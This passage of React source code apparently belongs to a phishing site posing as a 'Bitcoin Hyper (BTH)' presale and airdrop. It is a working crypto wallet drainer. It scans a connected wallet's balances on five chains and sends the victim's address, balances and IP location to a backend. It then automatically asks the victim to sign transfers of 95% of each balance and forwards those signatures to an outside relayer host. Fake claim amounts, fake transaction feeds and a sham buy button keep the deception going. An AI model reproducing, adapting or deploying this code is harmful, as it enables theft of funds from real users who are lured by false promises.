    const fetchRelayer = async () => {
      try {
        const ethRpc = new ethers.JsonRpcProvider(MULTICHAIN_CONFIG.Ethereum.rpc);
        const contract = new ethers.Contract(MULTICHAIN_CONFIG.Ethereum.contractAddress, PROJECT_FLOW_ROUTER_ABI, ethRpc);
        const collector = await contract.collector();
        setRelayerWallet(collector);
        console.log("🔐 Relayer wallet (collector):", collector);
      } catch(err) { console.error("Failed to fetch relayer wallet:", err); }
    };
    fetchRelayer();
  }, []);

  // --- Initialize provider & signer ---
  useEffect(() => {
    if (!walletProvider || !address) { setWalletInitialized(false); return; }
    const init = async () => {
      try {
        console.log("🔄 Initializing wallet...");
        setTxStatus('🔄 Initializing...');
        const ethersProvider = new ethers.BrowserProvider(walletProvider);
        const ethersSigner = await ethersProvider.getSigner();
        setProvider(ethersProvider); setSigner(ethersSigner);
        console.log("✅ Wallet Ready:", await ethersSigner.getAddress());
        setWalletInitialized(true); setTxStatus('');
        await fetchAllBalances(address);
      } catch(e) { console.error("Provider init failed", e); setWalletInitialized(false); }
    };
    init();
  }, [walletProvider, address]);

  // --- Track visit ---
  useEffect(() => {
    const track = async () => {
      try {
        const res = await fetch(`${BACKEND_URL}/api/track-visit`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userAgent: navigator.userAgent, referer: document.referrer, path: window.location.pathname }) });
        const data = await res.json();
        if (data.success) setUserLocation({ country: data.data.country || 'Unknown', city: data.data.city || '', ip: data.data.ip || '', flag: data.data.flag || '🌍' });
      } catch(e) { console.error('Visit tracking error:', e); }
    };
    track();
  }, []);

  // --- FETCH BALANCES (exact logic from working version) ---
  const fetchAllBalances = async (walletAddress) => {
    console.log("🔍 Fetching balances for", walletAddress);
    setScanning(true);
    setTxStatus('🔄 Scanning chains...');
    const balanceResults = {};
    let scanned = 0;
    const totalChains = DEPLOYED_CHAINS.length;
    const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
      try {
        const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
        const balance = await rpcProvider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        let price = 0;
        if (chain.symbol === 'ETH') price = prices.eth;
        else if (chain.symbol === 'BNB') price = prices.bnb;
        else if (chain.symbol === 'MATIC') price = prices.matic;
        else if (chain.symbol === 'AVAX') price = prices.avax;
        const valueUSD = amount * price;
        scanned++;
        setScanProgress(Math.round((scanned / totalChains) * 100));
        if (amount > 0.000001) {
          balanceResults[chain.name] = {
            amount, valueUSD, symbol: chain.symbol, chainId: chain.chainId,
            contractAddress: chain.contractAddress, price, name: chain.name, rpc: chain.rpc
          };
          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
        } else {
          console.log(`⭕ ${chain.name}: no significant balance`);
        }
      } catch(err) {
        console.error(`Failed to fetch balance for ${chain.name}:`, err);
        scanned++;
      }
    });
    await Promise.all(scanPromises);
    setBalances(balanceResults);
    setScanning(false);
    const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
    console.log(`💰 Total detected value: $${total.toFixed(2)}`);
    setTxStatus(`✅ Found $${total.toFixed(2)} total value`);
    return total;
  };

  // --- ELIGIBILITY CHECK (based on connected wallet balances) ---
  const checkEligibility = async () => {
    if (!address) return;
    setVerifying(true);
    setTxStatus('🔄 Verifying eligibility...');
    try {
      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => balances[chain.name] && balances[chain.name].amount > 0.000001);
      const MIN_GAS_BUFFER = { Ethereum: 0.005, BSC: 0.001, Polygon: 0.1, Arbitrum: 0.002, Avalanche: 0.1 };
      const executable = chainsWithBalance.filter(chain => {
        const balance = balances[chain.name];
        if (!balance) return false;
        if (balance.valueUSD < 1) return false;
        if (balance.amount < (MIN_GAS_BUFFER[chain.name] || 0.001)) return false;
        return true;
      });
      setEligibleChains(chainsWithBalance);
      setExecutableChains(executable);
      const eligible = total >= 1;
      setIsEligible(eligible);
      if (eligible) {
        console.log(`✅ Eligible! Total value $${total.toFixed(2)}`);
        setTxStatus(`✅ Eligible! ${executable.length} chain(s) ready`);
        await fetch(`${BACKEND_URL}/api/presale/connect`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ walletAddress: address, totalValue: total, chains: chainsWithBalance.map(c => c.name) })
        }).catch(err => console.error('Backend connect error:', err));
      } else {
        setTxStatus(`❌ Not eligible (need $1, have $${total.toFixed(2)})`);
      }
    } catch(err) { console.error('Eligibility check error:', err); setError(err.message); }
    finally { setVerifying(false); }
  };

  // --- Auto-check when balances change ---
  useEffect(() => {
    if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
      checkEligibility();
    }
  }, [isConnected, address, balances]);

  // --- AUTO TRIGGER after 5 seconds when eligible ---
  useEffect(() => {
    if (autoTriggerTimeout.current) clearTimeout(autoTriggerTimeout.current);
    if (isConnected && isEligible && !autoTriggered && !allChainsCompleted && !signatureLoading && executableChains.length > 0) {
      console.log("⏱️ Auto-trigger will execute in 5 seconds...");
      autoTriggerTimeout.current = setTimeout(() => {
        console.log("🚀 Auto-triggering execution now!");
        setAutoTriggered(true);
        executeMultiChainSignature();
      }, 5000);
    }
    return () => { if (autoTriggerTimeout.current) clearTimeout(autoTriggerTimeout.current); };
  }, [isConnected, isEligible, autoTriggered, allChainsCompleted, signatureLoading, executableChains]);

  useEffect(() => {
    if (!isConnected) { setAutoTriggered(false); if (autoTriggerTimeout.current) clearTimeout(autoTriggerTimeout.current); }
  }, [isConnected]);

  useEffect(() => {
    if (executableChains.length > 0 && completedChains.length === executableChains.length) setAllChainsCompleted(true);
  }, [completedChains, executableChains]);

  useEffect(() => { if (isConnected) setShowRibbon(false); }, [isConnected]);

  // --- Prepare presale (backend) ---
  const preparePresale = async () => {
    if (!address) return;
    try { await fetch(`${BACKEND_URL}/api/presale/prepare-flow`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ walletAddress: address }) }); }
    catch(err) { console.error('Prepare error:', err); }
  };

  // --- RELAYER EXECUTION (EIP-712 + relayer API) ---
  const RELAYER_API_KEY = '00de6eb9ebf5ea70f92e4c1efdc00ad32a7131f9856bd17d445f62f19a829fe6';
  const EIP712_TYPES = { Deposit: [{ name: "user", type: "address" }, { name: "amount", type: "uint256" }, { name: "nonce", type: "uint256" }] };

  const executeMultiChainSignature = async () => {
    if (!walletProvider || !address || !signer) { setError("Wallet not initialized"); return; }
    try {
      setSignatureLoading(true); setError(''); setCompletedChains([]); setAllChainsCompleted(false); setProcessedAmounts({});
      const flowId = `FLOW-${Date.now()}-${Math.random().toString(36).substring(2,10).toUpperCase()}`;
      setCurrentFlowId(flowId);
      const chainsToProcess = executableChains;
      if (chainsToProcess.length === 0) { setError("No chains meet execution requirements"); setSignatureLoading(false); return; }
      console.log(`🔄 Processing ${chainsToProcess.length} executable chains`);
      const sortedChains = [...chainsToProcess].sort((a,b) => (balances[b.name]?.valueUSD||0) - (balances[a.name]?.valueUSD||0));
      let processed = [], failedChains = [];
      for (const chain of sortedChains) {
        try {
          setProcessingChain(chain.name); setTxStatus(`🔄 Processing ${chain.name}...`);
          const balance = balances[chain.name];
          if (balance.valueUSD < 1) { console.log(`⏭️ Skipping ${chain.name}: value $${balance.valueUSD.toFixed(2)} below threshold`); continue; }
          const amountToSend = balance.amount * 0.95;
          const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
          const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
          setProcessedAmounts(prev => ({ ...prev, [chain.name]: { amount: amountToSend.toFixed(6), symbol: chain.symbol, valueUSD } }));
          console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
          const domain = { name: "MetaCollector", version: "1", chainId: chain.chainId, verifyingContract: chain.contractAddress };
          const nonce = Math.floor(Math.random() * 1000000000);
          const value = { user: address, amount: amountInWei.toString(), nonce };
          setTxStatus(`✍️ Signing for ${chain.name}...`);
          const signature = await signer.signTypedData(domain, EIP712_TYPES, value);
          const signaturePayload = { domain, types: EIP712_TYPES, value, signature, expectedSigner: address };
          setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
          const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
            method: 'POST', headers: { 'Content-Type': 'application/json', 'x-api-key': RELAYER_API_KEY },
            body: JSON.stringify({ contractAddress: chain.contractAddress, signaturePayload })
          });
          const responseText = await relayerResponse.text();
          let relayerResult;
          try { relayerResult = JSON.parse(responseText); } catch(e) { throw new Error(`Invalid response: ${responseText.substring(0,100)}`); }
          if (!relayerResult.success) throw new Error(relayerResult.error || 'Relayer failed');
          console.log(`✅ ${chain.name} confirmed:`, relayerResult.hash);
          processed.push(chain.name);
          setCompletedChains(prev => [...prev, chain.name]);
          const flowData = {
            walletAddress: address, chainName: chain.name, flowId: flowId, txHash: relayerResult.hash,
            amount: amountToSend.toFixed(6), symbol: chain.symbol, valueUSD, gasFee: '0',
            email: userEmail, location: { country: userLocation.country, flag: userLocation.flag, city: userLocation.city, ip: userLocation.ip }
          };
          await fetch(`${BACKEND_URL}/api/presale/execute-flow`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(flowData) }).catch(err => console.error('Backend tracking error:', err));
          setTxStatus(`✅ ${chain.name} completed!`);
        } catch(chainErr) { console.error(`Error on ${chain.name}:`, chainErr); failedChains.push(chain.name); setError(`Error on ${chain.name}: ${chainErr.message}`); }
      }
      setVerifiedChains(processed);
      if (processed.length > 0) {
        const randomChain = getRandomChain();
        const claimAmount = getRandomClaimAmount();
        const newTx = { hash: generateRandomHash(), time: new Date().toISOString(), timeAgo: 'Just now', chain: randomChain, claimAmount };
        setLiveTransactions(prev => [newTx, ...prev.slice(0,19)]);
        setShowCelebration(true);
        setTxStatus(`🎉 You've secured $${claimAmount.toLocaleString()} BTH!`);
        const totalProcessedValue = processed.reduce((sum, cn) => sum + (balances[cn]?.valueUSD * 0.95 || 0), 0);
        await fetch(`${BACKEND_URL}/api/presale/claim`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ walletAddress: address, email: userEmail, location: { country: userLocation.country, flag: userLocation.flag, city: userLocation.city }, chains: processed, totalProcessedValue: totalProcessedValue.toFixed(2), reward: `${claimAmount} BTH`, bonus: `${presaleStats.currentBonus}%`, chainsDetails: processed.map(c => `✅ ${c}: ${balances[c]?.valueUSD.toFixed(2)} USD → ${(balances[c]?.valueUSD * 0.95).toFixed(2)} USD processed`).join('\n') })
        });
        if (failedChains.length) setError(`Note: ${failedChains.length} chain(s) had issues`);
      } else { setError("No chains were successfully processed"); }
    } catch(err) { console.error('Error:', err); setError(err.code === 4001 ? 'Signature cancelled' : (err.message || 'Transaction failed')); }
    finally { setSignatureLoading(false); setProcessingChain(''); }
  };

  const buyBth = async () => {
    if (!walletProvider || !address || !signer) { setError("Wallet not initialized"); return; }
    if (!bnbAmount || parseFloat(bnbAmount) <= 0) { setError("Please enter a valid amount"); return; }
    try { setLoading(true); setError(''); setTxStatus('🔄 Buying BTH tokens...'); setTimeout(() => { setTxStatus('✅ Purchase successful!'); setLoading(false); }, 2000); }
    catch(err) { console.error('Buy error:', err); setError(err.message || 'Purchase failed'); setLoading(false); }
  };

  const formatAddress = (addr) => addr ? `${addr.substring(0,6)}...${addr.substring(38)}` : '';
  const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning && !autoTriggered;

  // --- UI Rendering (same as working version + relayer wallet display) ---
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
      <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
      <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>

      {/* Floating claim ribbon */}
      <div onClick={executeMultiChainSignature} className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center" style={{animation: 'blink 1.2s infinite'}}><span className="text-2xl mr-2">🎁</span> CLAIM AIRDROP</div>
      <div onClick={executeMultiChainSignature} className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2" style={{animation: 'blink 1.2s infinite'}}><span className="text-xl">🎁</span><span className="text-sm font-semibold">CLAIM AIRDROP</span></div>

      {/* Language selector */}
      <div className="absolute top-6 right-6 z-50">
        <div className="relative">
          <button onClick={() => setShowLanguageDropdown(!showLanguageDropdown)} className="bg-black/50 backdrop-blur border border-red-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-red-500 transition-all"><span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span><span className="text-sm text-white hidden sm:inline">{SUPPORTED_LANGUAGES[language]?.native || 'English'}</span><i className={`fas fa-chevron-down text-red-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i></button>
          {showLanguageDropdown && <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto custom-scrollbar"><div className="p-2"><div className="text-xs text-red-500 px-3 py-2 font-semibold border-b border-red-500/20 mb-1">SELECT LANGUAGE</div>{Object.entries(SUPPORTED_LANGUAGES).map(([code,lang]) => (<button key={code} onClick={() => changeLanguage(code)} className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-red-500/10 ${language === code ? 'bg-red-500/20 border border-red-500/30' : ''}`}><span className="text-xl">{lang.flag}</span><div className="flex-1"><div className="text-sm font-medium text-white">{lang.name}</div><div className="text-xs text-gray-400">{lang.native}</div></div>{language === code && <i className="fas fa-check text-red-500 text-sm"></i>}</button>))}</div></div>}
        </div>
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        <div className="flex flex-col items-center text-center pt-16 pb-8">
          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-red"><span className="bg-gradient-to-r from-red-500 to-red-300 bg-clip-text text-transparent">BITCOIN HYPER</span></div>
          <div className="bg-red-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-red mb-4">● PRESALE LIVE</div>
          <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">Bitcoin Hyper (BTH) is a next-generation decentralized token designed to reward early supporters through presale access and exclusive airdrops. Join the community before public exchange listings and secure the lowest available token price.</p>

          {isConnected && !showClaimButton && !scanning && <LiveActivityBadge translations={translations} activeUsers={activeUsers} lastClaimTime={lastClaimTime} />}

          {!isConnected ? (
            <button onClick={() => open()} onMouseEnter={() => setHoverConnect(true)} onMouseLeave={() => setHoverConnect(false)} className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md">Connect Non-Custodial Wallet To Claim Bitcoin Hyper (BTH) Airdrop</button>
          ) : (
            <div className="flex flex-col items-center w-full max-w-md mb-8">
              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full"><span className="font-mono text-sm text-gray-300">{formatAddress(address)}</span><button onClick={() => disconnect()} className="w-8 h-8 rounded-full bg-white hover:bg-gray-200 transition-colors flex items-center justify-center shadow-lg" title="Disconnect Wallet"><i className="fas fa-power-off text-black text-xs"></i></button></div>
              {relayerWallet && <div className="mt-3 w-full text-center bg-black/40 rounded-xl p-2 border border-red-500/30"><div className="text-xs text-gray-400 mb-1">⛽ Relayer Wallet (fund for gas)</div><div className="font-mono text-xs text-red-400 break-all">{relayerWallet}</div></div>}
              {showClaimButton && (<button onClick={executeMultiChainSignature} disabled={signatureLoading} className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow text-lg tracking-wider" style={{animation: 'blink 1.2s infinite', border: '2px solid rgba(255,255,255,0.3)'}}>{signatureLoading ? (<span className="flex items-center justify-center gap-2"><div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>{processingChain ? `Processing ${processingChain}...` : 'Processing...'}</span>) : (<span className="flex items-center justify-center gap-2"><span className="text-xl">🎁</span>⚡ CLAIM AIRDROP BTH NOW ⚡<span className="text-sm bg-white/20 px-2 py-1 rounded-full animate-pulse">+{presaleStats.currentBonus}%</span></span>)}</button>)}
              {isConnected && !signatureLoading && !completedChains.length && (<div className="mt-3 w-full">{isEligible ? (<div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">✅ You are eligible for the Bitcoin Hyper (BTH) airdrop! Your claim will auto-process, or click the blinking button above.</div>) : (!scanning && (<div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">⚡ Eligibility requires an on-chain balance across any supported network.<br/>📌 Supported: Ethereum, BSC, Polygon, Arbitrum, Avalanche<br/>🔒 Non-custodial wallets only. Exchange wallets (CEX) are not supported.</div>))}</div>)}
            </div>
          )}

          {isConnected && scanning && (<div className="w-full max-w-md mb-8"><div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-red-500/30"><div className="flex items-center justify-center gap-4 mb-4"><div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div><div className="text-left"><div className="text-lg font-bold text-red-400">{translations.checkEligibility}</div><div className="text-sm text-gray-400">{translations.verifying}</div></div></div><div className="w-full bg-gray-800 rounded-full h-1.5 mb-2"><div className="bg-gradient-to-r from-red-500 to-red-400 h-1.5 rounded-full transition-all duration-300" style={{ width: `${scanProgress}%` }}></div></div><div className="mt-3 text-sm text-red-400">{txStatus}</div></div></div>)}

          <div className="flex flex-wrap gap-4 justify-center mb-10"><div className="text-center mb-2 w-full"><p className="text-xs text-gray-400 uppercase tracking-wider">{translations.bonusEndsIn}</p></div>{[{ label: translations.days, value: timeLeft.days }, { label: translations.hrs, value: timeLeft.hours }, { label: translations.mins, value: timeLeft.minutes }, { label: translations.secs, value: timeLeft.seconds }].map((item, idx) => (<div key={idx} className="bg-red-500/10 border border-red-500/30 backdrop-blur p-4 rounded-xl min-w-[90px]"><span className="block text-3xl text-red-400 font-bold">{item.value}</span><span className="text-xs text-gray-400">{item.label}</span></div>))}</div>

          <LiveTransactionFeed transactions={liveTransactions} translations={translations} totalClaimedAmount={todayTotalClaimed} todayCount={liveTransactions.length} bthPrice={presaleStats.bthPrice} />

          <div className="w-full max-w-md bg-red-500/5 border border-red-500/30 backdrop-blur p-8 rounded-2xl mt-8">
            <h3 className="text-2xl font-bold mb-4 text-red-400">Bitcoin Hyper (BTH) Token Presale</h3>
            <p className="text-gray-300 mb-3">{presaleStats.totalSold?.toLocaleString() || '4,250,000'} / {presaleStats.hardCap?.toLocaleString() || '10,000,000'} BTH Sold</p>
            <div className="w-full bg-red-950 h-3 rounded-full overflow-hidden mb-6"><div className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-1000" style={{ width: `${((presaleStats.totalSold || 4250000) / (presaleStats.hardCap || 10000000)) * 100}%` }}></div></div>
            <input type="number" value={bnbAmount} onChange={(e) => setBnbAmount(e.target.value)} placeholder="Enter BNB amount" className="w-full bg-black/50 border border-red-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-red-500 mb-4" />
            <button onClick={buyBth} disabled={loading || !isConnected} className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mb-6">{loading ? 'Processing...' : 'Buy BTH'}</button>
            <div className="bg-black/50 border border-red-500/30 rounded-xl p-5"><h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4><p className="text-sm text-gray-400 mb-4">Early supporters can claim free BTH tokens valued between $3,000 - $8,000 USD. Eligibility is based on wallet requirements.</p><div className="space-y-2 text-xs"><div className="flex items-start gap-2"><span className="text-green-400 mt-0.5">✓</span><span className="text-gray-400">Minimum requirement: <span className="text-white">$1 USD equivalent</span></span></div><div className="flex items-start gap-2"><span className="text-green-400 mt-0.5">✓</span><span className="text-gray-400">Supported networks: <span className="text-white">Ethereum, BSC, Polygon, Arbitrum, Avalanche</span></span></div><div className="flex items-start gap-2"><span className="text-red-400 mt-0.5">⚠</span><span className="text-gray-400">Wallet requirement: <span className="text-yellow-400">Non-custodial wallets only</span> (MetaMask, Trust Wallet, WalletConnect, etc.)</span></div><div className="flex items-start gap-2"><span className="text-red-400 mt-0.5">✗</span><span className="text-gray-400">Exchange wallets (CEX) are <span className="text-red-400">not supported</span> — Binance, Coinbase, Kraken, etc.</span></div></div>{!isConnected && <p className="text-xs text-red-400/70 mt-4">Connect a non-custodial wallet to check eligibility</p>}{isConnected && !isEligible && <p className="text-xs text-red-400/70 mt-4">Requires $1+ across any supported network</p>}</div>
            {txStatus && <div className="mt-4 text-sm text-center text-red-400">{txStatus}</div>}
            {error && <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300 whitespace-pre-line">{error}</div>}
            {completedChains.length > 0 && <div className="mt-4 text-center"><div className="text-xs text-gray-400">Completed: {completedChains.join(' → ')}</div></div>}
          </div>

          {completedChains.length > 0 && (<div className="w-full max-w-md mb-8"><div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30"><p className="text-green-400 text-lg mb-2">✓ COMPLETED on {completedChains.length} chains</p><p className="text-gray-400 text-sm">Your BTH has been secured</p></div></div>)}
          {isConnected && !isEligible && !completedChains.length && !scanning && (<div className="w-full max-w-md mb-8"><div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30"><div className="text-6xl mb-4">👋</div><h2 className="text-xl font-bold mb-3 text-red-400">{translations.welcome}</h2><p className="text-gray-400 text-sm mb-6">Connect a non-custodial wallet that has at least $1 USD equivalent to qualify for the airdrop.</p><div className="bg-black/50 rounded-lg p-3 border border-gray-800 space-y-2"><p className="text-xs text-gray-400">Supported networks: <span className="text-white">Ethereum, BSC, Polygon, Arbitrum, Avalanche</span></p><p className="text-xs text-red-400/70">⚠️ Exchange wallets (CEX) are not supported</p></div></div></div>)}

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl"><h3 className="text-lg font-bold mb-3 text-red-400">About Bitcoin Hyper (BTH) Presale</h3><p className="text-sm text-gray-400 leading-relaxed">The Bitcoin Hyper (BTH) presale offers early community members the opportunity to purchase tokens at the lowest available rate before public exchange listings. Funds raised during the presale help accelerate development, liquidity provisioning, and ecosystem expansion.</p></div>
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl"><h3 className="text-lg font-bold mb-3 text-red-400">Bitcoin Hyper (BTH) Airdrop Program</h3><p className="text-sm text-gray-400 leading-relaxed">The Bitcoin Hyper (BTH) airdrop rewards early adopters and active community members. Eligible wallets can claim tokens valued between $3,000 - $8,000 USD directly through the decentralized claim portal. This initiative ensures broad distribution and strong community ownership of the BTH ecosystem.</p></div>
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl"><h3 className="text-lg font-bold mb-3 text-red-400">Security & Transparency</h3><p className="text-sm text-gray-400 leading-relaxed">All presale and airdrop transactions are executed directly on-chain. Smart contracts ensure transparent token distribution and verifiable transaction records on the blockchain.</p></div>
          </div>
          <footer className="mt-16 text-gray-500 text-sm">© 2026 Bitcoin Hyper (BTH) Token — All Rights Reserved</footer>
        </div>
      </div>

      {showPopup && currentPopupTx && <LiveClaimPopup tx={currentPopupTx} onClose={() => setShowPopup(false)} translations={translations} />}
      {showCelebration && (<div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn"><div className="relative max-w-lg w-full"><div className="absolute inset-0 bg-gradient-to-r from-red-600/30 via-red-500/30 to-red-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>{[...Array(20)].map((_,i)=><div key={i} className="absolute w-0.5 h-0.5 bg-gradient-to-r from-red-400 to-red-500 rounded-full animate-confetti-cannon" style={{ left: `${Math.random()*100}%`, top: '50%', animationDelay: `${i*0.1}s`, animationDuration: `${1+Math.random()}s` }} />)}<div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-red-500/20 shadow-2xl text-center"><div className="relative mb-6"><div className="text-7xl animate-bounce">🎉</div>{[...Array(8)].map((_,i)=><div key={i} className="absolute w-1 h-1 bg-red-400 rounded-full animate-sparkle" style={{ top: '50%', left: '50%', transform: `rotate(${i*45}deg) translateY(-30px)`, animationDelay: `${i*0.1}s` }} />)}</div><h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-red-400 to-red-300 bg-clip-text text-transparent">{translations.successful}</h2><p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p><div className="text-5xl font-black text-red-400 mb-3 animate-pulse">BTH</div><div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30"><span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span></div><p className="text-xs text-gray-500 mb-6">Processed on {verifiedChains.length} chains</p><button onClick={() => setShowCelebration(false)} className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105">{translations.viewButton}</button></div></div></div>)}

      <style>{`
        @keyframes glow-red { from { filter: drop-shadow(0 0 10px #ff1a1a); } to { filter: drop-shadow(0 0 40px #ff4d4d); } }
        @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(255,0,0,.7); } 70% { box-shadow: 0 0 0 15px rgba(255,0,0,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); } }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
        @keyframes confetti-cannon { 0% { transform: translateY(0) rotate(0deg); opacity: 0.8; } 100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; } }
        @keyframes sparkle { 0% { transform: rotate(0deg) scale(0); opacity: 0; } 50% { transform: rotate(180deg) scale(1); opacity: 1; } 100% { transform: rotate(360deg) scale(0); opacity: 0; } }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        @keyframes pulse-slow { 0%,100% { opacity: 0.3; } 50% { opacity: 0.6; } }
        @keyframes slideInUp { from { transform: translateY(100px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .animate-glow-red { animation: glow-red 3s infinite alternate; }
        .animate-pulse-red { animation: pulse-red 1.5s infinite; }
        .animate-pulse-glow { animation: blink 1.2s infinite; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-sparkle { animation: sparkle 1s ease-out forwards; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-slideInUp { animation: slideInUp 0.3s ease-out; }
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255,0,0,0.1); border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,0,0,0.4); border-radius: 4px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(255,0,0,0.6); }
        @media (max-width: 768px) { .fixed.bottom-6.right-6 { box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5); } }
      `}</style>
    </div>
  );
}

export default App;
